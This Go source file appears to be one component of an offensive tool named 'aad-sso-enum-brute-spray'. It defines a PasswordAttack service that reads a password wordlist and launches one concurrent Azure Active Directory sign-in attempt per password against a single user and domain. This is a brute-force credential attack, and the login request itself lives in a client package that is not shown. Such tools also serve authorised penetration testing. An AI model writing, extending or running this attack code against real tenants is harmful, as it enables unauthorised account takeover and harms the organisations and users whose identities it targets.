package services

import (
	"aad-sso-enum-brute-spray/pkg/clients"
	"bufio"
	"io"
	"log"
	"os"
	"sync"
)

type PasswordAttack struct {
	passwordFile string
    user     string
	domain string
	azureClient *clients.AzureClient
	wg *sync.WaitGroup
	writer io.Writer
}

func NewPasswordAttack(passwordFile string, user string, domain string, azureClient *clients.AzureClient,
	wg *sync.WaitGroup, writer io.Writer) *PasswordAttack {
	return &PasswordAttack{passwordFile: passwordFile, user: user, domain: domain, azureClient: azureClient, wg: wg, writer: writer}
}

func (p *PasswordAttack) Execute() {
	passwords, err := os.Open(p.passwordFile)
	if err != nil {
		log.Fatal(err)
	}
	defer passwords.Close()
	scannerPasswords := bufio.NewScanner(passwords)
	for scannerPasswords.Scan() {
		p.wg.Add(1)
		go p.azureClient.GetAzureActiveDirectory(p.domain, p.user, scannerPasswords.Text(), p.wg, p.writer)
	}
	if err := scannerPasswords.Err(); err != nil {
		log.Fatal(err)
	}
}
